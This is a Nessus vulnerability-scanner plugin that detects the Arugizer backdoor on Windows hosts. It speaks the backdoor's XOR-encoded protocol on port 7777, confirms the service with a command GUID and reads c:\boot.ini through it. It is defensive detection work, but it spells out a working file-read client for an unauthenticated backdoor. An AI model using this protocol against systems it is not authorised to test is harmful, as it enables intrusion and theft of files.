#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(45005);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2010-0103");
  script_bugtraq_id(38571);
  script_osvdb_id(62782);
  script_xref(name:"CERT", value:"154421");

  script_name(english:"Arugizer Backdoor Detection");
  script_summary(english:"Tries to read a file using the backdoor");
 
  script_set_attribute(
    attribute:"synopsis",
    value:"The remote Windows host has a backdoor."
  );
  script_set_attribute(
    attribute:"description", 
    value:
"The remote Windows host appears to be running the Arugizer backdoor. 

An unauthenticated, remote attacker who connects to this port can use
the backdoor to list directories, send and receive files, and execute
programs."
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.nessus.org/u?fba833e0"
  );
  script_set_attribute(
    attribute:"solution", 
    value:
"Verify whether the remote host has been compromised and reinstall the
operating system if necessary."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Energizer DUO USB Battery Charger Arucer.dll Trojan Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_cwe_id(94);
  script_set_attribute(attribute:"vuln_publication_date", value: "2010/03/05");
  script_set_attribute(attribute:"plugin_publication_date", value: "2010/03/08");
 script_cvs_date("$Date: 2015/05/01 13:42:51 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();
 
  script_category(ACT_GATHER_INFO);
  script_family(english:"Backdoors");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl");
  script_require_ports(7777);

  exit(0);
}


include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");


port = 7777;
if (known_service(port:port)) exit(0, "The service listening on port "+port+" is known.");
if (!get_tcp_port_state(port)) exit(0, "Port "+port+" is not open.");


set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);


function arugizer_send_recv(cmd)
{
  local_var arg, i, l, req, res, soc;

  if (isnull(cmd)) return NULL;

  soc = open_sock_tcp(port);
  if (!soc) exit(1, "Failed to open a socket on port "+port+".");

  # Construct the request.
  req = mkdword(strlen(cmd)+1) + cmd + mkbyte(0);
  foreach arg (_FCT_ANON_ARGS)
    req += mkdword(strlen(arg)+1) + arg + mkbyte(0);

  # XOR each byte with 0xe5.
  l = strlen(req);
  for (i=0; i<l; i++)
    req[i] = mkbyte(ord(req[i]) ^ 0xe5);

  send(socket:soc, data:req);
  if ('{E2AC5089-3820-43fe-8A4D-A7028FAD8C28}' >< cmd) l = 3;
  else
  {
    res = recv(socket:soc, length:4, min:4);
    if (strlen(res) != 4)
    {
      close(soc);
      return NULL;
    }

    for (i=0; i<4; i++)
      res[i] = mkbyte(ord(res[i]) ^ 0xe5);

    l = getdword(blob:res, pos:0);
    # nb: assume it's not the service if length > 10K.
    if (l > 10240)
    {
      close(soc);
      return NULL;
    }
  }

  res = recv(socket:soc, length:l, min:l);
  if (strlen(res) != l)
  {
    close(soc);
    return NULL;
  }

  for (i=0; i<l; i++)
    res[i] = mkbyte(ord(res[i]) ^ 0xe5);

  close(soc);
  return(res);
}


# Send a YES command and validate the result.
res = arugizer_send_recv(cmd:'{E2AC5089-3820-43fe-8A4D-A7028FAD8C28}');
if (isnull(res)) exit(0, "The service on port "+port+" does not appear to be the Arugizer backdoor.");
if (res != 'YES') exit(0, "The service on port "+port+" didn't respond as expected to a 'YES' command.");

register_service(port:port, proto:"arugizer");


# Retrieve a file.
file = 'c:\\boot.ini';

res = arugizer_send_recv(cmd:'{F6C43E1A-1551-4000-A483-C361969AEC41}', file);
if (isnull(res)) exit(0, "The service on port "+port+" does not appear to be the Arugizer backdoor.");


if ("[boot loader]" >< res)
{
  if (report_verbosity > 0)
  {
    report = '\n' +
      'Nessus was able to use the backdoor to retrieve the contents of\n' +
      "'" + file + "' on the remote host." + '\n';

    if (report_verbosity > 1)
      report += '\n' +
        'Here are its contents :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        res +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';

    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else exit(1, "The response from the service on port "+port+" does not look like the contents of '"+file+"'.");
